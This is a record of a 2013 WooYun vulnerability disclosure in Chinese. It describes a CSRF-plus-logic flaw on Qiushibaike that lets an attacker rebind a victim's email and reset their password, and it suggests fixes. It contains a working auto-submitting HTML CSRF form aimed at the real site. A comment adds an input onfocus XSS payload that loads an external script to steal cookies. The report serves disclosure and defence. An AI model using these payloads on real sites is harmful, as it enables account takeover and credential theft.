{"id": 60496, "wybug_id": "wooyun-2013-043061", "wybug_title": "糗事百科另类方式重置用户密码", "wybug_corp": "糗事百科", "wybug_author": "px1624", "wybug_date": "2013-11-17 14:49", "wybug_open_date": "2013-11-22 14:49", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "密码重置", "糗事百科"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 安全问题都是息息相关的，有时候你认为的一些鸡助无用的小漏洞（甚至不愿意承认那是漏洞），但是在一定情况下组合利用起来，就有可能成为很严重的漏洞额！这种另类的重置密码漏洞，估计有不少厂商都存在，希望厂商都能对安全这个整体引起重视吧。 详细说明：  糗事百科貌似一直对CSRF漏洞不太重视，这里我其实就是利用了邮箱绑定位置存在CSRF漏洞，在加上密码找回流程逻辑判断不严格，从而成功重置用户密码的。顺便友情提供：邮箱绑定的时候，还存在邮箱轰炸漏洞。测试过程，用两个帐号两个浏览器分别登录进行测试。1 大号去修改绑定的邮箱，抓包。\n\n2 可以看到，是一个post的请求。\n\n3 去掉refer，再次发送请求，发现可以仍然成功执行请求，接收到绑定邮箱的邮件。\n\n4 说明这里存在POST类型的CSRF漏洞。5 然后CSRF利用这里就不在详细说明了，不管是直接发url还是用img、iframe的src嵌入，都可以。6 外部poc构造的利用代码（将邮箱写为自己的邮箱）。\n<html><body><form name=\"px\" method=\"post\" action=\"http://www.qiushibaike.com/my/edit\"><input type=\"text\" name=\"_method\"\tvalue=\"put\"><input type=\"text\" name=\"user[avatar]\" value=\"\"><input type=\"text\" name=\"user[email]\" value=\"xxx@qq.com\"><input type=\"text\" name=\"commit\" value=\"提交\"></form><script>document.px.submit();</script></body></html>\n下面切换为小号，模拟正常用户。7 诱导用户中招CSRF后，会给自己的邮箱发送一封邮件，用于邮箱绑定。\n\n8 点击确认修改按钮发现可以直接成功修改，未登录小号帐号状态下，就可以成功修改绑定邮箱。（这里逻辑验证有问题，应该首先判断用户是否为登录状态，如果不是登录状态则判断为修改失败）。\n\n9 接下来就是用正常的密码找回流程去修改密码，填写好用户帐号和自己刚才修改好的自己的那个绑定邮箱。\n\n10 点击找回密码，会给自己刚才修改的绑定邮箱发送一个找回链接。\n\n11 然后去邮箱我们点击找回密码按钮。\n\n 12 然后就会打开密码修改的页面了。\n\n13 填写新密码，可以直接修改用户密码！\n\nTHAT'S ALL！THANKS   漏洞证明：  见上面详情。   修复方案：  修补措施：1 修补邮箱绑定位置的CSRF漏洞。2 修补邮箱绑定位置（是否为登录状态）的验证问题。   版权声明：转载请注明来源 px1624@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-11-22 14:49 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-18 09:08 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @px1624 糗事百科的洞用暴漫的方式应该效果会很好^_^    \n     2013-11-18 11:48 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  @px1624　如果我发现了一个<input >中的xss，我怎么利用这个漏洞盗取Cookie    \n     2013-11-18 12:03 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @大亮 如果有jq，那么直接<input onfocus=jQuery.getScript('外部js地址') autofocus>    \n     2013-11-18 12:03 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @小川 我没有用爆漫。上个越权的是爆漫。因为我觉得还是越权用爆漫效果最好    \n     2013-11-18 23:17 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  点击生效?    \n     2013-11-19 07:54 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @冷静  不完全正确    \n     2014-06-28 21:10 |    \t\t阿萨帝 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:68        | 不发礼物的索要联系方式都是耍流氓。)\t\t \n  图片2是什么工具？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}